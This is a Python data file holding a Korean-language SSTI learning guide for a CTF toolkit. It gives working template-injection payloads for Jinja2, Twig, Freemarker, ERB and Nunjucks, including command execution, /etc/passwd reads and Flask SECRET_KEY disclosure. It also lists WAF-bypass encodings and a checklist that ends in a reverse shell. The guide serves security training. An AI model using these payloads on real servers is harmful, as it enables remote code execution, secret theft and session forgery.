"""Server-Side Template Injection (SSTI) Learning Guide."""

SSTI_GUIDE = {
    "attack_type": "ssti",
    "title": "Server-Side Template Injection (SSTI) Guide",
    "severity": "critical",
    "difficulty": "intermediate",

    "overview": """SSTI는 사용자 입력이 서버 측 템플릿에 직접 삽입될 때 발생합니다.
템플릿 엔진은 보통 강력한 기능을 제공하므로, SSTI는 대부분 원격 코드 실행(RCE)으로 이어집니다.

Jinja2(Python), Twig(PHP), Freemarker(Java), ERB(Ruby) 등 다양한 템플릿 엔진에서 발생합니다.
{{7*7}}이 49로 출력되면 SSTI 취약점이 존재할 가능성이 높습니다.""",

    "impact": [
        "원격 코드 실행 (RCE)",
        "서버 완전 장악",
        "설정 및 환경 변수 노출",
        "파일 읽기/쓰기",
        "다른 시스템으로의 피벗",
    ],

    "vulnerable_patterns": [
        "render_template_string(user_input)",
        "Template(user_input).render()",
        "$template->render($user_input);",
    ],

    "techniques": {
        "detection": {
            "name": "SSTI Detection",
            "difficulty": "beginner",
            "how_it_works": """SSTI 탐지는 수학 연산이나 문자열 조작이 서버에서 실행되는지 확인합니다.
{{7*7}} 결과가 49라면 템플릿 엔진이 입력을 처리하고 있음을 의미합니다.
각 템플릿 엔진마다 문법이 다르므로 여러 페이로드를 시도해야 합니다.""",
            "prerequisites": [
                "사용자 입력이 템플릿에 반영됨",
                "출력이 화면에 표시됨",
            ],
            "payloads": [
                {"payload": "{{7*7}}", "purpose": "Jinja2/Twig 탐지", "expected": "49"},
                {"payload": "${7*7}", "purpose": "Freemarker/Velocity 탐지", "expected": "49"},
                {"payload": "<%= 7*7 %>", "purpose": "ERB 탐지", "expected": "49"},
                {"payload": "#{7*7}", "purpose": "Ruby 탐지", "expected": "49"},
                {"payload": "{{7*'7'}}", "purpose": "Jinja2 확정 (문자열 곱)", "expected": "7777777"},
                {"payload": "*{7*7}", "purpose": "Thymeleaf 탐지", "expected": "49"},
                {"payload": "@(1+1)", "purpose": "Razor 탐지", "expected": "2"},
            ],
            "detection_patterns": [
                "수학 연산 결과가 출력됨 (49, 7777777 등)",
                "템플릿 에러 메시지",
            ],
            "common_mistakes": [
                "{{}} 대신 실제 값이 그대로 출력되면 SSTI 아님",
                "클라이언트 측 템플릿(Angular 등)과 혼동 주의",
            ],
        },

        "jinja2": {
            "name": "Jinja2 (Python) Exploitation",
            "difficulty": "intermediate",
            "how_it_works": """Jinja2는 Python 객체에 접근할 수 있어 RCE가 가능합니다.
__class__, __mro__, __subclasses__를 통해 위험한 클래스에 접근합니다.
config 객체를 통해 Flask 설정(SECRET_KEY 등)을 노출시킬 수 있습니다.""",
            "prerequisites": [
                "Jinja2 템플릿 엔진 사용",
                "Python/Flask 환경",
            ],
            "payloads": [
                {"payload": "{{config}}", "purpose": "Flask 설정 노출", "expected": "SECRET_KEY 등 설정 값"},
                {"payload": "{{config.items()}}", "purpose": "설정 전체 열거", "expected": "모든 설정 키-값"},
                {"payload": "{{self.__class__.__mro__}}", "purpose": "클래스 계층 확인", "expected": "object 클래스까지 경로"},
                {"payload": "{{''.__class__.__mro__[2].__subclasses__()}}", "purpose": "사용 가능한 클래스 목록", "expected": "클래스 리스트"},
                {"payload": "{{cycler.__init__.__globals__.os.popen('id').read()}}", "purpose": "RCE (id 명령)", "expected": "uid=xxx gid=xxx"},
                {"payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "purpose": "RCE (대안)", "expected": "uid=xxx gid=xxx"},
            ],
            "detection_patterns": [
                "Flask 설정 값 노출",
                "Python 클래스 정보 출력",
                "명령 실행 결과",
            ],
            "common_mistakes": [
                "샌드박스가 있을 수 있음 - 여러 가젯 체인 시도",
                "__builtins__가 제한될 수 있음",
            ],
        },

        "twig": {
            "name": "Twig (PHP) Exploitation",
            "difficulty": "intermediate",
            "how_it_works": """Twig는 PHP 함수 호출을 허용하여 RCE가 가능합니다.
filter를 통해 system, exec 등의 함수를 호출할 수 있습니다.""",
            "prerequisites": [
                "Twig 템플릿 엔진 사용",
                "PHP 환경",
            ],
            "payloads": [
                {"payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "purpose": "Twig < 1.20 RCE", "expected": "uid=xxx"},
                {"payload": "{{['id']|filter('system')}}", "purpose": "Twig >= 1.20 RCE", "expected": "uid=xxx"},
                {"payload": "{{['cat /etc/passwd']|filter('system')}}", "purpose": "파일 읽기", "expected": "passwd 내용"},
                {"payload": "{{app.request.server.all|join(',')}}", "purpose": "서버 변수 노출", "expected": "서버 환경 변수"},
            ],
            "detection_patterns": [
                "PHP 함수 실행 결과",
                "서버 환경 변수 노출",
            ],
            "common_mistakes": [
                "Twig 버전에 따라 페이로드 다름",
            ],
        },

        "freemarker": {
            "name": "Freemarker (Java) Exploitation",
            "difficulty": "intermediate",
            "how_it_works": """Freemarker는 Java 객체를 인스턴스화하고 메서드를 호출할 수 있습니다.
Execute 클래스를 통해 시스템 명령을 실행할 수 있습니다.""",
            "prerequisites": [
                "Freemarker 템플릿 엔진 사용",
                "Java 환경",
            ],
            "payloads": [
                {"payload": "${7*7}", "purpose": "기본 탐지", "expected": "49"},
                {"payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "purpose": "RCE", "expected": "uid=xxx"},
                {"payload": "<#assign cmd=\"freemarker.template.utility.Execute\"?new()>${cmd(\"cat /etc/passwd\")}", "purpose": "파일 읽기", "expected": "passwd 내용"},
            ],
            "detection_patterns": [
                "Java 명령 실행 결과",
                "Freemarker 에러 메시지",
            ],
            "common_mistakes": [
                "Execute 클래스가 제한될 수 있음",
            ],
        },

        "erb": {
            "name": "ERB (Ruby) Exploitation",
            "difficulty": "intermediate",
            "how_it_works": """ERB는 Ruby 코드를 직접 실행할 수 있어 매우 위험합니다.
<%= %> 태그 내에서 시스템 명령을 실행할 수 있습니다.""",
            "prerequisites": [
                "ERB 템플릿 엔진 사용",
                "Ruby 환경",
            ],
            "payloads": [
                {"payload": "<%= 7*7 %>", "purpose": "기본 탐지", "expected": "49"},
                {"payload": "<%= system('id') %>", "purpose": "system() RCE", "expected": "uid=xxx"},
                {"payload": "<%= `id` %>", "purpose": "백틱 RCE", "expected": "uid=xxx"},
                {"payload": "<%= IO.popen('id').readlines() %>", "purpose": "IO.popen RCE", "expected": "uid=xxx"},
            ],
            "detection_patterns": [
                "Ruby 코드 실행 결과",
                "시스템 명령 출력",
            ],
            "common_mistakes": [
                "ERB는 기본적으로 RCE 가능",
            ],
        },

        "nunjucks": {
            "name": "Nunjucks (JavaScript) Exploitation",
            "difficulty": "advanced",
            "how_it_works": """Nunjucks는 Node.js 환경에서 사용되며, constructor를 통해 코드 실행이 가능합니다.""",
            "prerequisites": [
                "Nunjucks 템플릿 엔진 사용",
                "Node.js 환경",
            ],
            "payloads": [
                {"payload": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()} }", "purpose": "RCE", "expected": "uid=xxx"},
                {"payload": "{{constructor.constructor(\"return this.process.mainModule.require('child_process').execSync('id')\")()} }", "purpose": "대안 RCE", "expected": "uid=xxx"},
            ],
            "detection_patterns": [
                "Node.js 명령 실행 결과",
            ],
            "common_mistakes": [
                "constructor 접근이 차단될 수 있음",
            ],
        },
    },

    "checklist": [
        {
            "step": 1,
            "action": "템플릿 처리 기능 식별",
            "expected_result": "사용자 입력이 렌더링되는 위치 파악",
            "command_example": "ctf-toolkit recon --url http://target.com",
            "notes": "이름, 메시지, 커스텀 페이지 등"
        },
        {
            "step": 2,
            "action": "기본 탐지 페이로드 테스트",
            "expected_result": "{{7*7}}=49 또는 에러",
            "command_example": "ctf-toolkit ssti scan -u 'http://target.com?name='",
            "notes": "여러 템플릿 문법 시도"
        },
        {
            "step": 3,
            "action": "템플릿 엔진 식별",
            "expected_result": "사용 중인 엔진 파악",
            "command_example": None,
            "notes": "{{7*'7'}}=7777777 → Jinja2"
        },
        {
            "step": 4,
            "action": "설정/환경 노출 테스트",
            "expected_result": "SECRET_KEY, DB 연결 정보 등",
            "command_example": None,
            "notes": "{{config}}, {{settings}}, {{env}}"
        },
        {
            "step": 5,
            "action": "RCE 페이로드 시도",
            "expected_result": "id, whoami 결과",
            "command_example": None,
            "notes": "엔진별 RCE 가젯 사용"
        },
        {
            "step": 6,
            "action": "리버스 쉘 또는 파일 작업",
            "expected_result": "서버 접근 획득",
            "command_example": None,
            "notes": "RCE 확인 후 권한 확대"
        },
    ],

    "detection_patterns": [
        {
            "pattern_type": "behavior",
            "indicator": "수학 연산 결과 출력 (49, 7777777)",
            "confidence": "high",
            "db_specific": None,
            "example_response": "Hello, 49!"
        },
        {
            "pattern_type": "behavior",
            "indicator": "Python/PHP/Ruby 객체 정보 노출",
            "confidence": "high",
            "db_specific": None,
            "example_response": "<Config {'DEBUG': True, 'SECRET_KEY': 'xxx'...}>"
        },
        {
            "pattern_type": "behavior",
            "indicator": "명령 실행 결과 (uid=, root:)",
            "confidence": "high",
            "db_specific": None,
            "example_response": "uid=33(www-data) gid=33(www-data)"
        },
        {
            "pattern_type": "error_message",
            "indicator": "TemplateSyntaxError, Jinja2Exception",
            "confidence": "high",
            "db_specific": None,
            "example_response": "jinja2.exceptions.TemplateSyntaxError"
        },
        {
            "pattern_type": "error_message",
            "indicator": "FreeMarkerException",
            "confidence": "high",
            "db_specific": None,
            "example_response": "freemarker.core.InvalidReferenceException"
        },
    ],

    "waf_bypass": [
        {
            "technique": "문자열 연결",
            "example": "{{'id'|attr('__cla'+'ss__')}}",
            "effective_against": "키워드 필터"
        },
        {
            "technique": "hex/octal 인코딩",
            "example": "{{''[\"\\x5f\\x5fclass\\x5f\\x5f\"]}}",
            "effective_against": "문자열 필터"
        },
        {
            "technique": "request 객체 사용",
            "example": "{{request|attr(request.args.a)}}?a=__class__",
            "effective_against": "직접 키워드 차단"
        },
        {
            "technique": "Unicode 우회",
            "example": "{{'\u005f\u005fclass\u005f\u005f'}}",
            "effective_against": "ASCII 기반 필터"
        },
    ],

    "ctf_tips": [
        "{{7*7}}로 빠르게 SSTI 확인, 49면 취약",
        "{{7*'7'}}=7777777이면 Jinja2 확정",
        "Jinja2 RCE: {{cycler.__init__.__globals__.os.popen('id').read()}}",
        "Twig RCE: {{['id']|filter('system')}}",
        "ERB RCE: <%= `id` %> (가장 단순)",
        "{{config}}로 Flask SECRET_KEY 획득 → 세션 위조",
        "PayloadsAllTheThings SSTI 페이지 참고",
        "샌드박스 우회는 여러 가젯 체인 시도",
        "에러 메시지로 템플릿 엔진 식별 가능",
    ],
}
